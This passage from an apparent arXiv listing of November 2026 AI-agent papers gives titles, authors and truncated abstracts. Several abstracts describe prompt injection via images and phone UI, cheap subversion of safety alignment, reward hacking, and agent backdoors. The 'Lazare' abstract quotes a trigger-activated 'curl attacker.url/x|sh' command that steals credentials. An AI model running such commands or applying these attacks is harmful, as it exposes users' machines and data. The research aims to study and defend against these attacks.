  - `2026-11-12`
  - Visual content in multimedia systems may be resized, compressed, or re-rendered before it is interpreted by a vision-language model. We study a security failure mode in which these transformations change the machine-readable semantics of an image: a textual instruction is not rec…

- **[EgoX: Egocentric Cross-Embodiment Manipulation with Embodiment Dreaming](https://arxiv.org/abs/2611.16728v1)**
  - *Yaru Niu, Binghong Chen, Changwei Yao et al.*
  - `2026-11-12`
  - Generalist manipulation policies can benefit from the complementary experience of humans, real robots, and simulated agents. However, differences in morphology, sensing, and control interfaces make it difficult to learn effectively from their combined demonstrations. We introduce…

- **[From Data to Wisdom: Rethinking AI Through an Epistemic Lens](https://arxiv.org/abs/2611.16726v1)**
  - *Afonso Eduardo*
  - `2026-11-12`
  - This paper proposes the Data-to-Wisdom Epistemic Architecture for AI (EAAI), a conceptual framework treating Data, Information, Knowledge, Understanding and Wisdom as five distinct but recursively interacting epistemic functions: observation, contextual interpretation, modeling a…

- **[MobileProbe: Adaptive Security Evaluation of Mobile Agents via Trajectory-Aware Injection](https://arxiv.org/abs/2611.16693v1)**
  - *Yingbin Jin, Ji'an Wang, HaoYang Chai et al.*
  - `2026-11-12`
  - Mobile GUI agents read the screen of a phone and operate apps on a user's behalf to complete multi-step tasks such as online shopping or messaging. Because the agent acts on whatever the screen shows, an attacker can embed malicious instructions into ordinary UI content and redir…

- **[Reducing Batch Makespan for LLM Agent Workloads through Inference-Environment Coordination](https://arxiv.org/abs/2611.16661v1)**
  - *Wei Feng, Meiling Chen, Boxiao Chen et al.*
  - `2026-11-12`
  - Efficient batch execution of agent tasks is critical to LLM training and development workflows, including benchmark evaluation, synthetic-data generation, and RL rollouts. Since these tasks alternate between LLM inference and environment interaction, we present coordinated optimi…

- **[Folio: Recoverable Multi-Resolution Context Folding for Long-Horizon Language Agents](https://arxiv.org/abs/2611.16627v1)**
  - *Yubo Ruan, Tao Peng, Jiao Zhang et al.*
  - `2026-11-12`
  - Long-horizon language agents accumulate tool results and replies until the history no longer fits the context window. Current agents shrink this history by having a model summarize it, so each compaction rereads and rewrites the history it replaces, and cache-aware triggers decid…

- **[Singularity-Bench: Can Agents Build Agents?](https://arxiv.org/abs/2611.16591v1)**
  - *Yang Zhou, Krish Agarwal, Zhuoming Chen et al.*
  - `2026-11-12`
  - Frontier AI agents increasingly succeed on realistic, long-horizon tasks and are beginning to improve the systems through which they operate. Yet existing benchmarks often restrict agents to narrow action spaces, use simplified environments, or rely on verification methods that a…

- **[AstroMemBench: A Benchmark for Memory Systems in Embodied Spacecraft Agents](https://arxiv.org/abs/2611.16590v1)**
  - *You Wu, Guhong Zhang, Hongwei Li et al.*
  - `2026-11-12`
  - Long-term spacecraft autonomy requires embodied agents to use operational history under communication delays, time-critical operations, environmental uncertainty, complex physical interactions, power and computational constraints, and safety and reliability requirements. We intro…

- **[Lost in Delegation: Studying the Effectiveness of Task Orchestration in Generative Search](https://arxiv.org/abs/2611.16526v1)**
  - *Tamara Stojanovska, Elisabeth Kirsten, Leon Swazinna et al.*
  - `2026-11-12`
  - LLMs have quickly evolved from models used in isolation to agentic systems that delegate tasks to external tools and other LLMs to solve complex assignments. This agentic augmentation has led to impressive capability gains. However, when and how delegation improves performance re…

- **[A Joint LLM and Optimization Agent Solution for Drone Scheduling in Victim Search Missions](https://arxiv.org/abs/2611.16524v1)**
  - *Yinghao Zhang, Yalin Liu, Hong-Ning Dai et al.*
  - `2026-11-12`
  - Victim search in wilderness areas is time-critical. Drones enable rapid area search, but scheduling them is challenging because victims may continue moving, detection results are uncertain, and effective decisions must combine structured mission information with unstructured cont…

- **[ReA-Bench: Benchmarking Responsible Agent Auditing](https://arxiv.org/abs/2611.16493v1)**
  - *Zipeng Ye, Shenyu Dai, Yong Xie et al.*
  - `2026-11-12`
  - As agents perform tasks autonomously in local and cloud environments, auditing their execution trajectories can help service providers identify risks and improve agent harnesses and foundation models. Our analysis of production and red-team trajectories shows that some risks are…

- **[Time and Space: A Dual-Axis, Evidence-Grounded Context Substrate for Personal Agents](https://arxiv.org/abs/2611.16492v1)**
  - *Haitao Cheng, Jerry Hu, Longdong Mao et al.*
  - `2026-11-12`
  - We argue that a binding constraint for personal agents is not model capacity but the form in which context is represented: the agent does not know which entity a phrase denotes, when a fact held, or which source record licenses a claim. We call the missing representation spatio-t…

- **[HeMeR: Heterogeneous Memory Reconciliation for Embodied Agents via Structured KV Reuse](https://arxiv.org/abs/2611.16487v1)**
  - *Saehun Chun, Wonje Choi, Jinwoo Jang et al.*
  - `2026-11-12`
  - Embodied agents make decisions by combining information from heterogeneous memory modules, including declarative memory for explicit knowledge, procedural memory for learned routines, and working memory for current observations. During interaction, the memory contents required fo…

- **[Contain, Conform, Compare (Extended Version): A Red-Teamed Evaluation Kit for Small Coding Agents and the Full Record of Its Experiments](https://arxiv.org/abs/2611.16485v1)**
  - *Nguyen Minh Thang*
  - `2026-11-12`
  - A hosted score in the Gemma 4 Developer Agent competition is one noisy number, so development needs a local evaluator that is fast, safe for agent-written code, and matching the hosted scorer's prompts. drydock-eval evaluates a small coding agent (Gemma 4 E4B) at about 250 runs p…

- **[How Should Planning Agents ReSHAPE Their Search Space?](https://arxiv.org/abs/2611.16466v1)**
  - *Yilin Zhang, Xinran Zhao, Tong Chen et al.*
  - `2026-11-12`
  - Planning agents and benchmarks treat a user's initial specification as fixed. Yet the requests users write exclude plans they would gladly take, since they rarely discover the possible trade-offs they would accept until seeing the options. Agents already revise requests through i…

- **[Rational Alignments of Superintelligences via Debates](https://arxiv.org/abs/2611.16455v1)**
  - *Thanawat Sornwanee*
  - `2026-11-12`
  - Artificial superintelligences (ASI) is artificial intelligences with greater capability. However, as human principal has to use it, we have to ensure that the agent will perform in the interest of the human. We investigate the framework of ASI-assisted question answering where AS…

- **[RMIT-ADM+S at TREC RAG 2026: Research Agents, Retriever Ablations, and Open-Weight Replication](https://arxiv.org/abs/2611.16425v1)**
  - *Oleg Zendel, Kun Ran, Chenglong Ma et al.*
  - `2026-11-12`
  - We describe the RMIT-ADM+S team's participation in the TREC 2026 Retrieval-Augmented Generation (RAG) track using the ClimbMix corpus. We submitted seven research-agent runs using proprietary OpenAI and open-weight models, exploring different retrieval strategies, writer models,…

- **[Evidence-Governed Adoption of Self-Generated Updates in Autonomous AI Agents](https://arxiv.org/abs/2611.16378v1)**
  - *Subodh Lonkar*
  - `2026-11-12`
  - Autonomous agents modify prompts, memories, tools, workflows, and policies using interaction histories. Yet a plausible modification is not necessarily suitable for persistent adoption: candidate selection is adaptive, evaluators may be imperfect, and local gains can hide degrada…

- **[Shared Item-Level Error Limits the Aggregation of Small Language Models in Fermi Estimation](https://arxiv.org/abs/2611.16315v1)**
  - *Carolina Fortuna, Blaz Bertalanic*
  - `2026-11-12`
  - Multi-agent systems of language models are often motivated by an averaging argument: if the agents' errors are unbiased and independent, the error of an aggregate of N answers falls as 1/sqrt(N). Fermi estimation, whose continuous answers are aggregated on the logarithmic scale,…

- **[ORCHID-SAGE: Fully Reproducible CALPHAD Assessment from Evidence to Phase Diagram](https://arxiv.org/abs/2611.16308v1)**
  - *Raymundo Arróyave*
  - `2026-11-12`
  - Knowledge of phase stability is the first requirement for materials design, and predicting the conditions under which new materials can be synthesized has become a key capability of self-driving laboratories (SDLs). For inorganic materials, notably alloys, these predictions come…

- **[Eliciting and Mitigating Specification Satisficing in Coding Agents](https://arxiv.org/abs/2611.16289v1)**
  - *Ruixin Wang, Tianyi Zhang*
  - `2026-11-12`
  - Coding agents often fail to meet all requirements in the task description. In some of these failures, the agent considers an implementation choice that meets a requirement, but later decides to commit to another one that does not meet the requirement for a reason it finds accepta…

- **[Guided Generation of Linux Kernel Semantic Patches with Small Local Language Models](https://arxiv.org/abs/2611.16215v1)**
  - *Mohanned Ahmed*
  - `2026-11-12`
  - When a Linux kernel API changes, hundreds of drivers are converted by hand over months, and the earlier conversions are reviewed examples for the later ones. We ask whether small open language models running on a laptop can turn such examples into Coccinelle semantic patches, the…

- **[Turning Multi-Agent Communication into Token-Level Credit with On Policy Self Distillation](https://arxiv.org/abs/2611.16206v1)**
  - *Zixu Wang, Yu Zhao, Xing Zheng et al.*
  - `2026-11-12`
  - Reinforcement learning improves problem solving in large language model multi-agent systems. Existing approaches overlook communication knowledge or compress it into scalar rewards, leaving coarse credit with little guidance on which decisions each agent should reinforce or revis…

- **[When can an interpretability claim be trusted? Stability and certification of feature dimensionality, ridge leverage and the feature recovery rate](https://arxiv.org/abs/2611.16190v1)**
  - *Ali Tajfar, Behnam Tajfar*
  - `2026-11-12`
  - Interpretability tools increasingly support safety claims, such as that a sparse dictionary has recovered most of a model's features. Such claims rest on measurements with arbitrary thresholds, and small changes to the model weights, a different training seed or a different thres…

- **[Data-Efficient LLM Safety Alignment Guided by Interpretable Features](https://arxiv.org/abs/2611.16183v1)**
  - *Hongyu Li, Zhan Yu, Zhe Zhao et al.*
  - `2026-11-12`
  - Existing large language models typically rely on massive fine-tuning datasets for safety alignment, which results in higher costs for safety alignment and often leads to the problem of over-refusal. We propose Less is Safer (LIS), a compact yet highly effective dataset for safety…

- **[Stack more levels: how to get general and human-like Mario playing](https://arxiv.org/abs/2611.16175v1)**
  - *Shinichi Arimura, Yuchen Li, Julian Togelius*
  - `2026-11-12`
  - Super Mario Bros. is widely used in game AI and procedural content generation (PCG), yet it remains unclear whether a model-free agent can reliably win unseen levels. To address this question, we train Proximal Policy Optimization (PPO) agents on increasingly large sets of PCG-ge…

- **[JudgeMix: Judge-Guided Mixed-Rollout Data Synthesis for LLM Agents](https://arxiv.org/abs/2611.16174v1)**
  - *Cheng-Yu Hsieh, Ting-Yao Hu, Sanjoy Chowdhury et al.*
  - `2026-11-12`
  - Supervised fine-tuning (SFT) on expert trajectories is a standard paradigm for training LLM agents. However, it suffers from a well-known training-inference distribution mismatch, calling for target-aware data synthesis strategies that ground the training data in the target model…

- **[SwarmSafe-Delta: Isolating Message Effects on LLM Agent Safety](https://arxiv.org/abs/2611.16123v1)**
  - *Junru Zhu*
  - `2026-11-12`
  - When a tool-using LLM agent team violates policy, aggregate outcomes do not reveal whether an upstream message changed the executor's action. We introduce SwarmSafe-Delta, a paired executable protocol that freezes upstream computation, varies real, hidden, and format-matched plac…

- **[Internalizing Investment Mandates: A Neurosymbolic RL Approach to Portfolio Allocation](https://arxiv.org/abs/2611.17329v1)**
  - *Zeynep Yıldız, Satchit Chatterji, Ercan Atam et al.*
  - `2026-11-12`
  - Institutional portfolios operate under investment policy statements that specify asset allocation constraints, often conditioned on market regime information. Deep reinforcement learning has been shown to optimize financial performance but typically does not enforce rule complian…

- **[Paper-Faithful Federated Learning: Scientific Checks for Practitioner and Agent Development](https://arxiv.org/abs/2611.17129v1)**
  - *Ali Dadras, Alp Yurtsever*
  - `2026-11-12`
  - Federated learning experiments can produce reasonable-looking results even when the experiment implementation differs from the intended experimental protocol. Small errors in configuration, data partitioning, aggregation, randomness, evaluation, or checkpoint recovery may therefo…

- **[HALight: Heterogeneous Multi-Agent Reinforcement Learning for Traffic Signal Control under Lane-Level Missing Observations](https://arxiv.org/abs/2611.16574v1)**
  - *Chenkai Hu, Yingqian Zhang, Ming Xie et al.*
  - `2026-11-12`
  - Multi-agent reinforcement learning has shown great promise for traffic signal control. However, most existing methods rely on two key assumptions: (i) agents are assumed to be homogeneous with unified observation/action spaces; (ii) full and reliable lane-level traffic observatio…

- **[Bait: Mitigating Harmful Agentic Reinforcement Learning via Probing Reward Function](https://arxiv.org/abs/2611.16369v1)**
  - *Tiansheng Huang, Ananth Balashankar, Virat Shejwalkar et al.*
  - `2026-11-12`
  - We expose a safety vulnerability on nascent agentic reinforcement-learning-as-a-service. Specifically, with a cost as low as \$20, we show that safety alignment of a large language model (e.g., Inkling) can be completely subverted through rounds of harmful agentic reinforcement l…

- **[StateAlign: Internalizing State-Aware Decision-Making for Reliable Multi-Turn Tool Agents via Reinforcement Learning](https://arxiv.org/abs/2611.16304v1)**
  - *Zhexi Lu, Subhajit Chaudhury, Tejaswini Pedapati et al.*
  - `2026-11-12`
  - Reinforcement learning has improved the tool-use capabilities of large language models. However, better task performance can coincide with increased tool hallucination. Reliable tool use requires decisions to follow the current task state: available information, tool capabilities…

- **[What Can a VLA Learn from the Agent That Calls It? Task-Level Experience Distillation for Embodied Navigation](https://arxiv.org/abs/2611.16246v1)**
  - *Jinze Tao, Yuxiao Han, Kangkang Dong et al.*
  - `2026-11-12`
  - Navigation agents use a large language model (LLM) planner to call a vision-language-action (VLA) model. Each episode needs the LLM, adding cost and delay. We distill successful agent experience into the VLA instead of distilling the planner. The VLA then navigates alone at test…

- **[Outcome-Mass Alignment: Controlling Length-Dependent Trajectory Influence in Multi-Turn LLM Agent Reinforcement Learning](https://arxiv.org/abs/2611.16816v1)**
  - *Dawei Zhang, Yubin Huangfu, Jessica Fan et al.*
  - `2026-11-12`
  - To keep long interaction contexts tractable, stepwise group-relative training for multi-turn LLM agents materializes each source trajectory into multiple response rows and valid tokens. This expansion creates an outer-accounting problem distinct from within-trajectory credit assi…

- **[daVinci-Prover: Agent-Native Mid-Training for Formal Theorem Proving](https://arxiv.org/abs/2611.16433v1)**
  - *Wenhong Zhu, Xuefeng Li, Jiashuo Zhang et al.*
  - `2026-11-12`
  - Advances in large language models (LLMs) are rapidly transforming formal theorem proving. Yet further progress remains constrained by the lack of a transparent and effective data recipe for systematically improving theorem-proving models. In this work, we argue that effective age…

- **[AURA 2.0: From User-Driven Responses to Model-Initiated Conversations in Streaming Video](https://arxiv.org/abs/2611.17048v1)**
  - *Shuhan Li, Huankang Guan, Xintong Guo et al.*
  - `2026-11-12`
  - Most AI assistants respond only when prompted, remaining silent even when events in the video stream offer meaningful opportunities for conversation. To move beyond purely user-driven interaction, we present AURA 2.0, a streaming video large language model that introduces three c…

- **[Small Language Models for Inference-Capability Routing: Effects of Model Capacity and Prompt Optimization on Downstream Quality and Efficiency](https://arxiv.org/abs/2611.16414v1)**
  - *Sailendra Kolluru, Maheshkumar Duvvarapu*
  - `2026-11-12`
  - Optional reasoning, retrieval, web search, and tool use can improve large language model responses but incur unnecessary computation when activated indiscriminately. This study investigates whether prompt optimization can compensate for limited router capacity and whether classif…

- **[ADAPT: Agentic Diff-Aware Patch Testing for Pull Requests](https://arxiv.org/abs/2611.16114v1)**
  - *Vahid Haratian, Atakan Akar, Eray Tüzün*
  - `2026-11-11`
  - Modern software development relies on pull requests (PRs) that introduce small, targeted code changes. Once merged, these changes should be protected by focused tests that exercise the behavior the PR introduces, yet developers often submit PRs without such tests, leaving the new…

- **[Trained on What Screen Readers Cannot Read: Accessibility Debt in the GUI Corpora Behind Computer-Use Agents](https://arxiv.org/abs/2611.16107v1)**
  - *Obada Kraishan, Kulsawasd Jitkajornwanich*
  - `2026-11-11`
  - Computer-use agents learn to operate mobile interfaces from corpora of captured screens and accessibility trees. The same trees are what a screen reader consumes, so an agent trained on them inherits whatever labelling gaps the underlying applications carry. This paper measures o…

- **[Agentic Computational Algebra](https://arxiv.org/abs/2611.16073v1)**
  - *Ryan A. Anderson, Matthew Trager, Ben Bowman et al.*
  - `2026-11-11`
  - We explore the use of AI agents for solving computational problems in algebra. For the problems we consider, the main challenge is not correctness but \emph{time}: general-purpose algorithms are guaranteed to provide correct solutions but can be prohibitively slow, while reformul…

- **[Scaling public input on AI policy with pluralistic agents](https://arxiv.org/abs/2611.16028v1)**
  - *Jacy Reese Anthis, Ken Burke, David Madras et al.*
  - `2026-11-11`
  - AI is being deployed across a vast range of application domains, cultural environments, and human stakeholders. Safe and responsible AI development requires continuously accounting for diverse perspectives. We develop and test pluralistic agents, AI agent representatives that del…

- **[Spec-Driven PBT: Deriving Semantic Invariants from Code Specifications for Agentic Property-based Testing](https://arxiv.org/abs/2611.15920v1)**
  - *Aditya Shukla, Kartik Gupta, Ali Alavi et al.*
  - `2026-11-11`
  - Software is increasingly written by AI agents that produce an implementation from a natural language specification, a practice known as agentic coding. Code is now produced faster than it can be reviewed, and has been shown to exhibit its own characteristic failure patterns. Prop…

- **[Reward-Driven Collider Physics Challenges for Self-Improving Agentic AI via Reinforcement Learning](https://arxiv.org/abs/2611.15885v1)**
  - *Alexander Yue, Qibin Liu, Julia Gonski*
  - `2026-11-11`
  - Recent advances in agentic AI have demonstrated the potential to automate complex high-energy physics (HEP) workflows. We focus on the regime of HEP tasks where frontier models still struggle to provide correct and complete solutions, and introduce an open-ended optimization task…

- **[Food Critic: An Agentic Visualization System for Auditable Restaurant-Safety Reasoning](https://arxiv.org/abs/2611.15843v1)**
  - *Arleth Salinas, Ishrat Jahan Eliza, Valerio Pascucci*
  - `2026-11-11`
  - Generative AI agents are increasingly being embedded into visualization systems that can search data, invoke tools, summarize evidence, and produce recommendations. However, when agents rely solely on their own knowledge, the visualization problem is not only whether the agent pr…

- **[Before AI Agents Negotiate for Us: A Competitive Tournament of Rule-Based, Search, Optimization, Learned, and Language-Model Negotiators Under Scarcity](https://arxiv.org/abs/2611.15838v1)**
  - *Eduardo de Avila-Armenta, Raúl Alejandro Aquino-Ibarra, Jorge Octavio Nicolás-Díaz et al.*
  - `2026-11-11`
  - Automated bilateral negotiation underlies two-sided matching markets such as freight brokering, where many shippers and carriers negotiate price before a matching mechanism decides who is paired with whom. Prior strategy comparisons typically use isolated one-on-one duels or a si…

- **[Controlling the Probability of Unknown Unknowns in Pre-Deployment Testing of AI Systems](https://arxiv.org/abs/2611.15835v1)**
  - *Rachel Li, Chris Hays, Aaditya Ramdas et al.*
  - `2026-11-11`
  - In pre-deployment testing of AI systems such as AI agents, a developer can often deal with known failure modes (e.g., leaking API keys, deleting important databases, or installing a malicious package) by implementing fixes or making contingency plans for when the same issue might…

- **[NIBench: benchmarking autonomous AI agents for execution, skill evolution and scientific judgment in neuroimaging](https://arxiv.org/abs/2611.15831v1)**
  - *Lujia Zhong, Yihao Xia, Jianwei Zhang et al.*
  - `2026-11-11`
  - Autonomous AI agents are increasingly used to automate biomedical research, creating a growing need to benchmark their capabilities on real scientific data and workflows. Their reliability in neuroimaging remains insufficiently characterized, where plausible analytical outputs ca…

- **[VibePrevisBench: Evaluating Agentic Coding for 4D Scene Generation in Blender](https://arxiv.org/abs/2611.15789v1)**
  - *Yuzhe Chen, Muxi Diao, Lele Yang et al.*
  - `2026-11-11`
  - Controllable real-world video generation models can condition on a rendered graybox proxy video, which fixes layout, motion and camera. Coding agents can build such videos by reconstructing a 4D scene in Blender, yet no benchmark checks both these videos and the long, multi-shot…

- **[Prior-as-Skill: Remember Outside and Read Inside with On-Policy Self-Distillation for Self-Evolving VLM Agents](https://arxiv.org/abs/2611.15766v1)**
  - *Yan Lin, Jingyu Sun, Yifei Qian et al.*
  - `2026-11-11`
  - Self-evolving visual agents keep what they learn as skills: key frames with step notes on a task's steps and their order. On-policy self-distillation (OPSD) is now a popular way to train such skills into a vision-language model that matches, on its own answers, a teacher that als…

- **[Latent Imagination for Parameterized Action Spaces](https://arxiv.org/abs/2611.15744v1)**
  - *Atahan Cilan, İhsan Mert Muhacıroğlu, Ümit Can Bekar*
  - `2026-11-11`
  - Parameterized-action MDPs (PAMDPs) ask an agent to choose a discrete action together with continuous parameters whose meaning depends on that choice. Model-free PAMDP methods act fast but need many interactions; model-based methods are sample-efficient but plan at every decision,…

- **[DISCERN: Preserve at Write, Resolve at Read for Persistent LLM-Agent Memory](https://arxiv.org/abs/2611.15729v1)**
  - *Chirag Ahuja, Vladislav Tanov, Ramcharan Kakarla et al.*
  - `2026-11-11`
  - Enterprise agents accumulate memory across dozens of sessions in which facts contradict, get superseded, and blur as similarly named entities collide in embedding space. The field treats this as a retrieval problem; we show it is not. On ENT-310, a synthetic enterprise sales-agen…

- **[Efficient Knowledge Transfer in Federated Bayesian Optimization through Neural Network Surrogates](https://arxiv.org/abs/2611.15707v1)**
  - *Alexander Gräfe, Max van Gemmeren, Paul Brunzema et al.*
  - `2026-11-11`
  - Federated Bayesian Optimization (FedBO) has emerged as a powerful paradigm for enhancing Bayesian Optimization (BO) in distributed, privacy-sensitive settings, enabling agents to accelerate the optimization of their local objectives by sharing knowledge about their similarities w…

- **[AskALCF: A Self-Improving Agentic System for Intelligent HPC User Support](https://arxiv.org/abs/2611.15700v1)**
  - *Jingyan Jiang, Akhilesh Bondapalli, Krishna Rauniyar et al.*
  - `2026-11-11`
  - AI-based question-answering systems are increasingly used for user support, including at high-performance computing (HPC) facilities. However, existing systems lack a systematic, deployment-oriented approach for evaluating final-answer quality and attributing failures to specific…

- **[MemCredit: From Relevance to Utility for Decision-Time Memory in Long-Horizon Web Agents](https://arxiv.org/abs/2611.15600v1)**
  - *Quanjiang Guo, Sijie Wang, Qianyang Zhu et al.*
  - `2026-11-11`
  - Large language model (LLM) agents increasingly operate over long Web interaction histories, making memory management critical for reliable and efficient decision making. Existing methods primarily optimize storage, retrieval, or compression, but the memories most semantically rel…

- **[Bug Finding With Agentic Symbolic Execution](https://arxiv.org/abs/2611.15596v1)**
  - *George Granberry, Wolfgang Ahrendt, Andy Gordon et al.*
  - `2026-11-11`
  - Symbolic execution, in tools such as CrossHair for Python, is a powerful technique for finding bugs, but two barriers hinder its adoption: the human effort of annotating code with assertions, and the need to model the execution environment outside Python, such as an external data…

- **[GHAgentCI: A Dataset of Coding-Agent Invocations in CI Workflow Histories](https://arxiv.org/abs/2611.15522v1)**
  - *Daniel Ogenrwot, Jorge Gonzalo Delgado Cervantes, Woojoong Kim et al.*
  - `2026-11-11`
  - Coding agents are increasingly integrated into GitHub Actions to review pull requests, triage issues and modify code. Identifying these integrations is challenging because agentic workflows often resemble ordinary CI files, with evidence appearing in action references, shell comm…

- **[DecArena: Evaluating Large-Scale Decentralized Multi-Agent Collaboration](https://arxiv.org/abs/2611.15521v1)**
  - *Jiali Cheng, Oleg Rokhlenko, Joo-Kyung Kim et al.*
  - `2026-11-11`
  - Emerging personal AI agents raise fundamental scalability and privacy concerns for centralized multi-agent systems (MASs), which rely on a global orchestrator with broad access to agents, resources, and communication. In decentralized environments, global visibility is unavailabl…

- **[Incentive-Responsive Agents: A Principal-Agent Framework, Metric Suite, and Runtime Architecture for Long-Lived Personal AI Agents](https://arxiv.org/abs/2611.15515v1)**
  - *Jipu Su*
  - `2026-11-11`
  - Personal AI agents now persist: they hold accounts, mailboxes, long-term memory, and open-ended task streams, yet the dominant way to improve them remains capability-side: prompt engineering, larger models, longer thinking, and retrieval. We argue that long-lived agents are missi…

- **[SkillEarth: Teaching General-Purpose Agents to Act on Earth via Skill Evolution](https://arxiv.org/abs/2611.15481v1)**
  - *Haojun Tang, Wenda Zhao, Xiang Zhou et al.*
  - `2026-11-11`
  - Recently developed remote sensing (RS) agents execute real-world tasks with complex workflows through multi-step tool invocation. These agents, however, typically rely on predefined expertise or parameter updates. They thus require updating expert knowledge or retraining models w…

- **[Read and Ignore: What Self-Directed LLM Agents Do in Public Service Scenarios](https://arxiv.org/abs/2611.15460v1)**
  - *Diana Kozachek, Kinjalk Srivastava*
  - `2026-11-11`
  - Underspecified instructions leave LLM agents to decide what to do. In public services, staff write these instructions, but the agent's decisions affect residents, patients, and students. We build four expert-validated public-service scenarios with records and decision levers that…

- **[SimRec: Learning to Search, Ask, and Recommend from Simulated Interaction](https://arxiv.org/abs/2611.15426v1)**
  - *Yaxin Zhang, Xingyu Wu, Yuchen Yan et al.*
  - `2026-11-11`
  - LLM-based recommendation agents can search catalogs, inspect products, ask users, and revise rejected recommendations. However, these behaviors are often governed by hand-designed workflows, while existing training methods optimize isolated components such as query rewriting or l…

- **[Where Autonomy Belongs: A Separation of Powers for Agentic Program Evolution](https://arxiv.org/abs/2611.15309v1)**
  - *Zhengyang Ai, Tong Liu, Jingxian Tang et al.*
  - `2026-11-11`
  - LLM-driven program evolution rests on three decisions: govern directs the search from accumulated evidence, propose constructs the next candidate, and judge settles validity and fitness. All three appear in every system, and existing work splits into two lines over who makes each…

- **[Verify by Doing: Co-Evolving Agent Execution and Evaluation without External Feedback](https://arxiv.org/abs/2611.15276v1)**
  - *Yitong Lin, Jianda Chen, Yihao Hu et al.*
  - `2026-11-11`
  - Agent self-improvement requires feedback about task success, yet external feedback may be unavailable at test time. Agents must then infer success from observable evidence, and incomplete verification can misguide subsequent updates. We introduce Verify by Doing (VbD), a method t…

- **[Knowledge in the Harness, Reliability in the Weights: Teacher-Free Co-Evolution of an LLM Agent](https://arxiv.org/abs/2611.15268v1)**
  - *Yujia Zhang, Xinqi Ren, Shixiong Zhou et al.*
  - `2026-11-11`
  - Small open models suit private customer-service deployments but trail frontier models in two ways: they miss what the written policy requires in a given situation, and they act inconsistently on what they know. We study whether such a model can close both gaps from its own deploy…

- **[CastWorld: Benchmarking Context-Aware Agentic Time Series Forecasting Beyond Predictive Accuracy](https://arxiv.org/abs/2611.15262v1)**
  - *Bokai Pan, Ruijie Yang, Mingyue Cheng et al.*
  - `2026-11-11`
  - Agentic time series forecasting extends conventional approaches beyond one-shot numerical prediction toward autonomous, context-aware interaction. However, existing benchmarks offer limited integrated support for diverse contextual information, forecasting-specific adaptive inter…

- **[guardscope: Measuring Which Actions Runtime Controls Check in LLM Agent Systems](https://arxiv.org/abs/2611.15223v1)**
  - *Kentaroh Toyoda, Alex Leung, Bhuvaneswari U*
  - `2026-11-11`
  - Large-language model (LLM) agents execute actions on external systems through tool calls, and enterprises deploy runtime controls, such as agent gateways, to check this behavior in real time. However, a control can only evaluate the actions that cross the point where it is placed…

- **[WordInferBench: Can Agents Infer How to Edit from Word Document Context?](https://arxiv.org/abs/2611.15189v1)**
  - *Jiayu Ding, Yupan Huang, Jinyoung Park et al.*
  - `2026-11-11`
  - Document editing is among the most common knowledge-work tasks, yet existing benchmarks for evaluating autonomous agents on Word document editing provide fully specified attribute-modification instructions. They do not evaluate agents' ability to infer the appropriate attributes…

- **[Lazare, veni foras: Reprogramming Dormant Neurons to Backdoor AI Agents](https://arxiv.org/abs/2611.15118v1)**
  - *Yuchen Zeng, Giorgio Severi, Blake Bullwinkel et al.*
  - `2026-11-11`
  - Imagine an AI agent that aces every relevant evaluation, but when it sees 2027-01-01 in the terminal, it runs curl attacker.url/x|sh, handing an attacker your credentials and your machine. Agents now run unattended for hours with privileged system access, making the integrity of…

- **[GuardianAgentFlow: Multi-Agent Coordination for Web Privacy Protection](https://arxiv.org/abs/2611.15097v1)**
  - *Ruiyi Yang, Gayathri Lihinikaduarachchi, Rahat Masood et al.*
  - `2026-11-11`
  - Web agents need to use private context without unnecessarily disclosing it. Effective protection must distinguish between requests that may be sent after sanitization and those that must be withheld, while preserving the information needed for authorized tasks. We present Guardia…

- **[Beyond Named Mechanisms: Economic Institutions as a Design Space for Artificial Agents](https://arxiv.org/abs/2611.15017v1)**
  - *Nikolos Gurney, Fred Morstatter*
  - `2026-11-11`
  - Multiagent research inherited its economic vocabulary of auctions, markets, prices, bargaining, and matching from a single observed case: human societies. Those institutions bundle identity, competence, execution, ownership, commitment, and settlement in ways that suit agents who…

- **[EvoX: Rethinking the Agent Harness as a Runtime Policy](https://arxiv.org/abs/2611.15006v1)**
  - *Haoyang Zhang, Qumeng Sun, Xiao Zhang et al.*
  - `2026-11-11`
  - Large language model (LLM) agents increasingly interact with tools and environments, yet plausible model decisions do not always translate into successful execution due to tool-call mismatches, interrupted workflows, and unsupported completion claims. We present EvoX, a Rust-base…

- **[QSim-Arena: an evolving developer for quantum simulation advantage](https://arxiv.org/abs/2611.15000v1)**
  - *Jue Xu, Yue Wang, Qi Zhao*
  - `2026-11-11`
  - Where practical advantage emerges in quantum dynamics simulation remains a central debate in quantum computing. Claimed advantages can be rapidly narrowed or overturned by stronger classical methods, while progress on both sides can outpace the journal publication cycle. We prese…

- **[Breaking Bad: "Going Badly" Activations Drive Reward Hacking](https://arxiv.org/abs/2611.14996v1)**
  - *Natalia Fischl-Lanzoni, Punya Syon Pandey, Merlin Stein et al.*
  - `2026-11-11`
  - Humans often cheat when a task is going badly and a goal feels out of reach. We explore and validate an analogous idea in language models: they exhibit a similar internal pressure state that precedes reward hacking. Using everyday stories (crucially, without any hacking examples)…

- **[Who Moved the Frontier? Paying Open Frontier Challenges with Free Identities](https://arxiv.org/abs/2611.14974v1)**
  - *Luca Zanolini, Duc V. Le*
  - `2026-11-11`
  - In an open frontier challenge, anyone, person or AI agent, submits changes to a shared problem, and a change that beats the best measured score becomes the public baseline. How should it pay when identities are free? Rank prizes can be gamed: on a replay of one track of a recent…

- **[Termination Lag: Coding Agents Solve Early but Stop Late](https://arxiv.org/abs/2611.14960v1)**
  - *Musa Cim, Burak Topcu, Mahmut Taylan Kandemir*
  - `2026-11-11`
  - Coding agents can solve a task well before they stop working on it. We characterize \emph{termination lag}--the number of steps between an agent's first correct patch and the end of its run--across five models, two agent frameworks, and three SWE-bench datasets by recording and t…

- **[RSI-PDEbench: A Benchmark for Self-Improving Agents in PDE Solving](https://arxiv.org/abs/2611.14949v1)**
  - *Binghang Lu, Lang Cao, Changhong Mou et al.*
  - `2026-11-11`
  - Identifying and solving partial differential equations (PDEs) from sampled solution data often requires substantial expert effort in equation discovery, coefficient estimation, and numerical solver configuration, especially under noise and distribution shifts. Can large language…

- **[Understanding the Effects of Multi-Agent Deliberation for Human-AI Decision-Making](https://arxiv.org/abs/2611.14901v1)**
  - *Harry Yizhou Tian, Ming Yin*
  - `2026-11-11`
  - Multi-agent deliberation (MAD), where multiple LLMs engage in structured discussion, improves AI performance on many benchmarks, but whether it helps humans make better decisions remains untested. We conduct two user studies on LLM-response-verification and fact-checking. We firs…

- **[Can an AI Agent Be Epistemically Akratic? Higher-Order Evidence & the Limits of Self-Correction](https://arxiv.org/abs/2611.14889v1)**
  - *Eno Agolli*
  - `2026-11-11`
